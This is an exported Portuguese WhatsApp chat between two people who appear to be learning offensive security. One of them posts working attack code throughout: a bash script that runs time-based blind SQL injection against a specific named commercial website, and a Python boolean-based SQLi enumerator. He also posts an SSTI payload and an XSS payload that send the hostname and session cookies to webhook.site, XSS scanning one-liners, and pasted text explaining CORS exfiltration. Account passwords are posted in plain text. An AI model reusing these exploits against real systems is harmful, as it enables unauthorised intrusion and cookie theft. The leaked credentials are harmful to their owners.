+# Imprime a lista de letras com tempo superior a 5 segundos
+echo "Letras com tempo superior a 5 segundos: ${letras_superior_5[@]}"
+‎[11/03/2024, 07:08:44] yas💕: ‎figurinha omitida
+‎[11/03/2024, 15:51:12] yago martins: ‎imagem ocultada
+[11/03/2024, 20:54:13] yas💕: SELECT table_name
+FROM information_schema.tables
+WHERE table_schema = 'seu_banco_de_dados'
+LIMIT 2, 1;
+[11/03/2024, 21:02:51] yas💕: SELECT 
+  IF(SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema = 'seu_banco_de_dados' LIMIT 1), 1, 1) = 'a', SLEEP(3), NULL);
+[12/03/2024, 02:32:37] yago martins: #!/bin/bash
+
+letras=(- . 0 1 2 3 4 5 6 7 8 9 : "?" "@" "!" "#" "$" "%" "&" "*" "(" ")" "_" "+" "=" \
+"A" "B" "C" "D" "E" "F" "G" "H" "I" "J" "K" "L" "M" "N" "O" \
+"P" "Q" "R" "S" "T" "U" "V" "W" "X" "Y" "Z")
+
+tb_length=""
+i=1
+j=1
+
+while [ -z "$tb_lenght"];
+do
+
+    start_time=$(date +%s.%N)
+
+    lynx -head -dump "https://minasca.com.br/single-produtos.php?id=1000000%27%20or%20IF(length((SELECT%20table_name%20FROM%20information_schema.tables%20WHERE%20table_schema%20=%20%27minascac_banco%27%20LIMIT%201))%20=%20$i,%20SLEEP(4),%20NULL)--%27" >/dev/null
+
+    end_time=$(date +%s.%N)
+
+    elapsed_time=$(echo "$end_time - $start_time" | bc)
+        
+    if [ "$(echo "$elapsed_time > 3" | bc)" -eq 1 ]; then
+        tb_length=$i
+        echo "o tamanho do nome da tabela eh: $tb_length"
+        break
+    else
+        echo "tentativa $i"
+        i=$((i + 1))
+    fi
+done
+
+
+while [ "$j" -le "$tb_length" ];
+do
+    for letra in "${letras[@]}"
+    do
+        start_time=$(date +%s.%N)
+
+        # Execute o comando com lynx
+        lynx -head -dump "https://minasca.com.br/single-produtos.php?id=1000000%27%20or%20IF(SUBSTRING((SELECT%20table_name%20FROM%20information_schema.tables%20WHERE%20table_schema%20=%20%27minascac_banco%27%20LIMIT%201),%201,%201)%20='${letra}', SLEEP(4), NULL)--'" >/dev/null
+   
+        # Obtemos o tempo depois da execução
+        end_time=$(date +%s.%N)
+
+        # Calculamos o tempo decorrido em segundos
+        elapsed_time=$(echo "$end_time - $start_time" | bc)
+        
+        echo "Caracter $letra demorou $elpsed_time"
+        if [ "$(echo "$elapsed_time > 3" | bc)" -eq 1 ]; then
+
+           echo "primeira letra da table: $letra"
+           if [ "$(echo "$elapsed_time > 10" | bc)" -eq 1 ]; then
+               echo "Indice $j possivelmente com a letra errada"
+           fi
+
+            list+=("$letra")
+            j=$((j + 1))
+            break
+            sleep 5
+
+        fi   
+    done
+        echo "letras achadas: ${list[@]}"
+done
+echo "Nome da table: ${list[@]}"
+[12/03/2024, 02:32:48] yago martins: # URL de exemplo
+url="http://www.example.com"
+
+# Use Lynx para obter os cabeçalhos da resposta
+headers=$(lynx -head -dump "$url" 2>/dev/null)
+
+# Encontrar o valor do cabeçalho Content-Length
+content_length=$(echo "$headers" | grep -i "Content-Length" | awk '{print $2}')
+
+# Exibir o tamanho da resposta
+echo "Tamanho da resposta: $content_length bytes"
+[12/03/2024, 10:32:32] yago martins: select count (*) from information_schema.tables where table_schema = 'database_name'
+‎[13/03/2024, 15:28:46] yago martins: ‎imagem ocultada
+[14/03/2024, 16:15:01] yago martins: chapei
+[14/03/2024, 16:23:37] yas💕: ctf d sexta
+[14/03/2024, 16:23:41] yas💕: ih pq
+[15/03/2024, 01:51:48] yago martins: ta mais dificl doq eu pensei sushuhusuhs
+[15/03/2024, 01:51:48] yago martins: import requests
+
+def dbLength(url, content_length):
+    i = 1
+    db_length = 0
+
+    while db_length == 0:
+        new_url = url + f"%20and%20IF(length(database())={i},1,NULL)"
+        response = requests.get(new_url)
+        content = response.content
+        content_length_new = len(content)
+
+        if content_length_new == content_length:
+            db_length = i
+        else:
+            i += 1
+    
+    return db_length
+
+def dbContent(url, content_length, db_length, letras[])
+    i = 0
+    while i < db_length:
+        new_url = url + f"%20and%20IF(SUBSTRING(database(),{i},1)="g",1,NULL)"
+
+##VARIAVEIS
+letras = ["-", ".", "0", "1", "2", "3", "4", "5", "6", "7", "8", "9", ":", "?", "@", "!", "#", "$", "%", "&", "*", "(", ")", "_", "+", "=", "A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O", "P", "Q", "R", "S", "T", "U", "V", "W", "X", "Y", "Z"]
+
+
+url = input("Qual é a URL a ser verificada: ")
+
+if '=' in url:
+    print("URL válida.")
+else:
+    print("Verifique a URL.")
+
+response = requests.get(url)
+
+if response.status_code == 200:
+        
+        content = response.content
+        content_length = len(content)
+
+        db_length = dbLength(url, content_length)
+        print(f'O comprimento do banco de dados é: {db_length}')
+else:
+    print("O servidor não respondeu :(")
+[15/03/2024, 01:51:58] yago martins: vo dormi se nao amanha eu n acordo
+[15/03/2024, 02:18:37] yago martins: nao consegui dormir sem fazer oq eu tinha prometido
+‎[15/03/2024, 02:20:21] yago martins: ‎imagem ocultada
+[15/03/2024, 02:20:26] yago martins: 😝
+‎[15/03/2024, 02:23:04] yago martins: ‎vídeo omitido
+[15/03/2024, 02:23:12] yago martins: import requests
+
+def dbLength(url, content_length):
+    i = 1
+    db_length = 0
+
+    while db_length == 0:
+        new_url = url + f"%20and%20IF(length(database())={i},1,NULL)"
+        response = requests.get(new_url)
+        content = response.content
+        content_length_new = len(content)
+
+        if content_length_new == content_length:
+            db_length = i
+        else:
+            i += 1
+    
+    return db_length
+
+def dbContent(url, content_length, db_length, letras):
+    i = 1
+    db_name = []
+    
+    while i <= db_length:
+        for letra in letras:
+            new_url = url + f"%20and%20IF(SUBSTRING(database(),{i},1)='{letra}',1,NULL)"
+            
+            response = requests.get(new_url)
+            content = response.content
+            content_length_new = len(content)
+            ##DEBUG
+            print(f"testando letra {letra} no campo {i}, length = {content_length_new}")
+            ##FIM DEBUG
+            if content_length_new == content_length:
+                db_name.append(letra)
+                ##DEBUG
+                print(f"letra encontrada: {letra}")
+                ##FIM DEBUG
+                break
+        i += 1
+    else:
+        print(f"letra nao encontrada para o array {i}")
+    return db_name
+    
+##VARIAVEIS
+letras = ["A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O", "P", "Q", "R", "S", "T", "U", "V", "W", "X", "Y", "Z", "-", ".", "0", "1", "2", "3", "4", "5", "6", "7", "8", "9", ":", "?", "@", "!", "#", "$", "%", "&", "*", "(", ")", "_", "+", "="]
+
+
+url = input("Qual é a URL a ser verificada: ")
+
+if '=' in url:
+    print("Começando o Scanning.")
+else:
+    print("Verifique se a url contem o motedo GET.")
+
+response = requests.get(url)
+
+if response.status_code == 200:
+        
+        content = response.content
+        content_length = len(content)
+
+        db_length = dbLength(url, content_length)
+        print(f'O comprimento do banco de dados é: {db_length}')
+        db_name = dbContent(url, content_length, db_length, letras)
+        print(f"Nome do banco: {''.join(db_name)}")
+else:
+    print("O servidor não respondeu :(")
+[15/03/2024, 09:00:32] yago martins: nmap —script scan
+[16/03/2024, 22:50:52] yago martins: https://www.hacksplaining.com/lessons
+[17/03/2024, 02:24:08] yago martins: /sev-home/
+
+Apache/2.4.7
+
+PASS >> InvincibleHack3r USER >> boris
+NAME >> Natalya Boris
+
+ports open >> SMTP -25 , HTTP -80, POP3 -55007, SSL -55006
+‎[04/04/2024, 20:10:45] yago martins: ‎imagem ocultada
+[04/04/2024, 21:21:58] yago martins: let code, hackerrank
+[08/04/2024, 00:09:05] yago martins: https://www.youtube.com/watch?v=_ay4RyGzduw
+‎[22/04/2024, 11:18:02] yago martins: ‎imagem ocultada
+[22/04/2024, 15:10:00] yago martins: www11.unipampa.edu.br/html/
+[22/04/2024, 15:10:19] yago martins: apache 2.4.7
+[26/04/2024, 20:08:28] yago martins: https://portswigger.net/web-security/cross-site-scripting/cheat-sheet?fbclid=PAZXh0bgNhZW0CMTEAAaaZUyf2-pZvwQfmLBmnwF9yq2XigDqO24K6yTSsrCQ-TONDWuaOY_oXESE_aem_AdYvi_FDAebIqCqOtnejfpF8M-RU1KNZ9Tis6LdGr2_hincigPc_w7xLMjfsRsiNxhBhO2dKcCWsLpMC2OPSrssI
+[07/05/2024, 01:15:25] yago martins: https://youtu.be/CS_Th38ADug?si=qGu0anfIRiTPEguN
+[10/05/2024, 18:02:38] yago martins: script pra pegar resposta de graca no brainly
+[24/05/2024, 10:13:00] yago martins: assetfinder dominio.com | waybackurls | qsreplace '"><svg onload=confirm(1)>' | airixss -payload "confirm(1)" | egrep -v "Not"
+[24/05/2024, 10:13:49] yago martins: echo dominio.com | cariddi -itensive | uro | gf xss | dalfox pipe —skip-bav -S
+[29/05/2024, 20:09:17] yago martins: senha portswigger ?Re3.Y{a:k7{f6j92"3Rcf558gGgcf6/
+‎[29/05/2024, 21:49:17] yago martins: ‎imagem ocultada
+[04/06/2024, 21:31:45] yago martins: senha portswigger ?Re3.Y{a:k7{f6j92"3Rcf558gGgcf6/
+[06/06/2024, 10:15:43] yago martins: ‎Mensagem apagada
+‎[06/06/2024, 10:15:44] yago martins: ‎imagem ocultada
+‎[06/06/2024, 10:15:44] yago martins: ‎imagem ocultada
+‎[06/06/2024, 10:15:44] yago martins: ‎imagem ocultada
+‎[06/06/2024, 10:15:44] yago martins: ‎imagem ocultada
+‎[06/06/2024, 10:15:45] yago martins: ‎imagem ocultada
+‎[06/06/2024, 10:15:45] yago martins: ‎imagem ocultada
+‎[06/06/2024, 10:15:45] yago martins: ‎imagem ocultada
+[06/06/2024, 10:39:56] yago martins: ‎Mensagem apagada
+[06/06/2024, 10:39:56] yago martins: ‎Mensagem apagada
+[06/06/2024, 10:39:57] yago martins: ‎Mensagem apagada
+[06/06/2024, 10:39:57] yago martins: ‎Mensagem apagada
+[06/06/2024, 10:39:58] yago martins: ‎Mensagem apagada
+[06/06/2024, 10:39:58] yago martins: ‎Mensagem apagada
+[06/06/2024, 10:39:58] yago martins: ‎Mensagem apagada
+‎[06/06/2024, 10:51:03] yago martins: ‎imagem ocultada
+‎[06/06/2024, 10:51:04] yago martins: ‎imagem ocultada
+‎[06/06/2024, 10:51:04] yago martins: ‎imagem ocultada
+‎[06/06/2024, 10:51:04] yago martins: ‎imagem ocultada
+[06/06/2024, 10:51:05] yago martins: ‎Mensagem apagada
+‎[06/06/2024, 10:51:05] yago martins: ‎imagem ocultada
+‎[06/06/2024, 10:51:05] yago martins: ‎imagem ocultada
+[06/06/2024, 11:39:56] yago martins: ‎Mensagem apagada
+[06/06/2024, 11:49:43] yago martins: ‎Mensagem apagada
+[06/06/2024, 11:52:17] yago martins: ‎Mensagem apagada
+[06/06/2024, 12:13:56] yago martins: ‎Mensagem apagada
+‎[06/06/2024, 12:34:19] yago martins: ‎vídeo omitido
+‎[06/06/2024, 13:24:29] yago martins: ‎vídeo omitido
+‎[12/06/2024, 17:29:53] yago martins: python.pdf • ‎193 páginas ‎documento omitido
+‎[16/06/2024, 09:48:06] yago martins: emagrecer.pdf • ‎1 página ‎documento omitido
+‎[20/06/2024, 15:18:51] yago martins: ‎vídeo omitido
+[20/06/2024, 15:27:08] yas💕: LINDOKOOOOOOO
+[20/06/2024, 15:27:10] yas💕: SABE MUITO
+[20/06/2024, 15:27:12] yas💕: GRACAD A DEUS
+[21/06/2024, 09:52:16] yago martins: ‎Mensagem apagada
+[21/06/2024, 09:52:17] yago martins: ‎Mensagem apagada
+[21/06/2024, 09:52:17] yago martins: ‎Mensagem apagada
+[21/06/2024, 09:52:17] yago martins: ‎Mensagem apagada
+[21/06/2024, 09:52:18] yago martins: ‎Mensagem apagada
+[21/06/2024, 09:52:18] yago martins: ‎Mensagem apagada
+[26/06/2024, 15:26:30] yago martins: Senha hackerone: '8f93*3u%-N12hj9$u7?
+[05/07/2024, 22:20:37] yago martins: excalidraw- redes
+[16/07/2024, 08:57:54] yago martins: web-check.xyz
+[08/08/2024, 16:31:01] yago martins: heapdump, actuator -spring
+[29/08/2024, 23:00:46] yago martins: enumeração bastante
+
+enumerar+gau+katana+paramspider+ depois cat com qsreplace e httpx para verificar se reflete no site e mandar bala
+[03/09/2024, 23:52:47] yago martins: {{"".join.__class__.__base__.__subclasses__()[156].__init__.__globals__['system']('for /F "tokens=*" %i in (\'hostname\') do curl webhook.site/96bf67d0-31e1-4dd9-b3ba-e64b6a1e5f72/%i')}}
+[25/09/2024, 18:05:48] yago martins: Sim, dependendo da **configuração inadequada de CORS** no domínio principal ou em outro subdomínio elegível, pode ser possível explorar o **open redirect** mesmo que o subdomínio com a falha de **open redirect** não seja diretamente elegível no programa de bug bounty.
+
+Aqui está uma abordagem de como isso poderia ser explorado:
+
+### 1. **Verificar a Configuração CORS no Domínio Principal**
+Primeiro, você precisa verificar se o domínio principal ou outro subdomínio elegível possui uma configuração CORS inadequada. Isso pode incluir:
+
+- **Access-Control-Allow-Origin: *** (aceita requisições de qualquer origem).
+- **Access-Control-Allow-Credentials: true** (permite o envio de cookies ou cabeçalhos de autenticação junto com a requisição).
+
+Se você encontrar essa configuração inadequada, ela pode ser usada para realizar requisições entre diferentes origens (inclusive do subdomínio vulnerável) e acessar recursos restritos no domínio principal.
+
+### 2. **Usar o Open Redirect para Bypass**
+Mesmo que o subdomínio vulnerável não esteja elegível no programa, você pode usá-lo em conjunto com uma configuração CORS insegura no domínio principal para realizar ações como:
+
+- **Roubo de dados sensíveis**: Se a origem do subdomínio vulnerável for confiada pelo domínio principal, você pode explorar o open redirect para redirecionar o fluxo de requisições para um site malicioso e capturar informações sensíveis, como cookies de sessão, tokens de autenticação, ou até realizar ataques de **session fixation**.
+  
+  Exemplo de exploração:
+  1. Você cria um payload malicioso no subdomínio vulnerável:
+     ```
+     https://subdomain-vulnerable.com/redirect?url=https://malicious-site.com
+     ```
+  2. Se o domínio principal tiver uma configuração CORS inadequada (por exemplo, aceitando requisições do subdomínio vulnerável), você poderia fazer um script que realize uma requisição para o domínio principal com a `Access-Control-Allow-Credentials: true`, aproveitando o fato de que o navegador confia nesse subdomínio.
+  3. Assim, a requisição poderia ser redirecionada para o site malicioso e os dados da vítima, como cookies e tokens, poderiam ser enviados para o atacante.
+
+### 3. **Ataques Cross-Site Data Leakage**
+Se o domínio principal aceita requisições do subdomínio vulnerável via CORS, mesmo com credenciais, o atacante pode usar o subdomínio vulnerável para explorar a falha de CORS no domínio principal. Por exemplo:
+
+- Realizar requisições autenticadas de APIs no domínio principal (que normalmente requerem autenticação) e ler as respostas.
+- Se o navegador da vítima tem sessões ativas com o domínio principal, você poderia explorar essa vulnerabilidade para obter dados sensíveis da API que o navegador tem acesso.
+
+### Exemplo de Exploração:
+
+- **Passo 1**: O subdomínio vulnerável com open redirect redireciona para um site malicioso controlado por você:
+   ```https
+   https://subdomain-vulnerable.com/redirect?url=https://attacker-site.com
+   ```
+
+- **Passo 2**: O site malicioso realiza uma requisição CORS para o domínio principal, que tem CORS mal configurado:
+   ```javascript
+   fetch("https://main-domain.com/sensitive-api", {
+       credentials: "include"  // Inclui os cookies da sessão
+   })
+   .then(response => response.text())
+   .then(data => {
+       // Exfiltra dados sensíveis para o servidor do atacante
+       fetch("https://attacker-site.com/log?data=" + encodeURIComponent(data));
+   });
+   ```
+
+- **Passo 3**: Os dados sensíveis do domínio principal são exfiltrados via CORS inseguro.
+
+### Conclusão
+
+Mesmo que o subdomínio vulnerável com o open redirect não esteja diretamente elegível no programa de bug bounty, ainda pode haver uma forma de explorá-lo se o **domínio principal ou outro subdomínio elegível** tiver uma má configuração de CORS. A ideia seria utilizar o open redirect para redirecionar usuários e explorar a confiança estabelecida pelo navegador entre os subdomínios, podendo levar a **roubo de dados** ou **requisições não autorizadas**.
+
+Se isso for possível, pode ser considerado um problema de segurança mais amplo que envolve **falhas de CORS** e **open redirect**, e seria interessante relatar o caso ao programa de bug bounty, focando na exploração do CORS no domínio elegível.
+‎[25/09/2024, 18:08:38] yas💕: ‎figurinha omitida
+[25/09/2024, 18:08:42] yas💕: eu nao sabendo configura o cors
+‎[10/10/2024, 10:46:38] yago martins: ‎imagem ocultada
+‎[10/10/2024, 10:46:38] yago martins: ‎imagem ocultada
+‎[10/10/2024, 10:46:38] yago martins: ‎imagem ocultada
+‎[10/10/2024, 10:46:39] yago martins: ‎imagem ocultada
+‎[10/10/2024, 10:46:39] yago martins: ‎imagem ocultada
+‎[10/10/2024, 10:46:40] yago martins: ‎imagem ocultada
+‎[10/10/2024, 10:46:40] yago martins: ‎imagem ocultada
+‎[10/10/2024, 10:46:41] yago martins: ‎imagem ocultada
+‎[10/10/2024, 10:46:41] yago martins: ‎imagem ocultada
+[15/10/2024, 09:32:57] yago martins: <img src="x" onerror=document.location=%27https://webhook.site/790fbd5e-8cc4-441e-9a81-6ac18f40cb5f?c=%27+document.cookie;">
